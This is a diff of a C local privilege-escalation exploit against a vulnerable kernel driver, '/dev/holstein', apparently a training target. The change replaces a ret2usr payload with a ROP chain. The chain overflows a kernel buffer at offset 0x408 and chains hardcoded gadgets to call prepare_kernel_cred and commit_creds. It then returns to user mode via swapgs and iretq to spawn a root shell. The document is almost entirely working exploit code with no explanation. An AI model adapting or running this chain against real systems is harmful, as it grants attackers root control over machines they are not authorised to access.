@@ -4,21 +4,16 @@
 #include <stdlib.h>
 #include <string.h>
 #include <unistd.h>
+
 int global_fd;
+unsigned long user_cs, user_ss, user_rsp, user_rflags;
 #define prepare_kernel_cred 0xffffffff8106e240
 #define commit_creds 0xffffffff8106e390
-
-void fatal(const char *msg) {
-  perror(msg);
-  exit(1);
-}
-
-void open_kn() {
-  global_fd = open("/dev/holstein", O_RDWR);
-  if (global_fd < 0) {
-    exit(-1);
-  }
-}
+#define rop_pop_rdi 0xffffffff8127bbdc
+#define rop_pop_rcx 0xffffffff8132cdd3
+#define rop_mov_rdi_rax_rep_movsq 0xffffffff8160c96b
+#define rop_swapgs 0xffffffff8160bf7e
+#define rop_iretq 0xffffffff810202af
 
 static void win() {
   char *argv[] = {"/bin/sh", NULL};
@@ -26,52 +21,49 @@ static void win() {
   puts("[+] win!");
   execve("/bin/sh", argv, envp);
 }
-
-unsigned long user_rip = (unsigned long)win;
-void escalate_privs(void) {
-  __asm__(".intel_syntax noprefix;"
-          "movabs rax, 0xffffffff8106e240;" // prepare_kernel_cred
-          "xor rdi, rdi;"
-          "call rax; mov rdi, rax;"
-          "movabs rax, 0xffffffff8106e390;" // commit_creds
-          "call rax;"
-          "swapgs;"
-          "mov r15, user_ss;"
-          "push r15;"
-          "mov r15, user_sp;"
-          "push r15;"
-          "mov r15, user_rflags;"
-          "push r15;"
-          "mov r15, user_cs;"
-          "push r15;"
-          "mov r15, user_rip;"
-          "push r15;"
-          "iretq;"
-          ".att_syntax;");
+void open_kn() {
+  global_fd = open("/dev/holstein", O_RDWR);
+  if (global_fd < 0) {
+    exit(-1);
+  }
 }
-void write_kn() {
-  uint64_t buf[150];
-  buf[129] = (uint64_t)escalate_privs;
-
-  write(global_fd, buf, sizeof(buf));
-  puts("[+] write success");
+static void save_state() {
+  asm("movq %%cs, %0\n"
+      "movq %%ss, %1\n"
+      "movq %%rsp, %2\n"
+      "pushfq\n"
+      "popq %3\n"
+      : "=r"(user_cs), "=r"(user_ss), "=r"(user_rsp), "=r"(user_rflags)
+      :
+      : "memory");
 }
-
-unsigned long user_cs, user_ss, user_rflags, user_sp;
-void save_state() {
-  __asm__(".intel_syntax noprefix;"
-          "mov user_cs, cs;"
-          "mov user_ss, ss;"
-          "mov user_sp, rsp;"
-          "pushf;"
-          "pop user_rflags;"
-          ".att_syntax;");
-  puts("[*] Saved state");
+void fatal(const char *msg) {
+  perror(msg);
+  exit(1);
 }
 int main() {
   save_state();
   open_kn();
-  write_kn();
+  char buf[0x500];
+  memset(buf, 'A', 0x408);
+  unsigned long *chain = (unsigned long *)&buf[0x408];
+  *chain++ = rop_pop_rdi;
+  *chain++ = 0;
+  *chain++ = prepare_kernel_cred;
+  *chain++ = rop_pop_rcx;
+  *chain++ = 0;
+  *chain++ = rop_mov_rdi_rax_rep_movsq;
+  *chain++ = commit_creds;
+  *chain++ = rop_swapgs;
+  *chain++ = rop_iretq;
+  *chain++ = (unsigned long)&win;
+  *chain++ = user_cs;
+  *chain++ = user_rflags;
+  *chain++ = user_rsp;
+  *chain++ = user_ss;
+  write(global_fd, buf, (void *)chain - (void *)buf);
+
+  close(global_fd);
 
   return 0;
 }
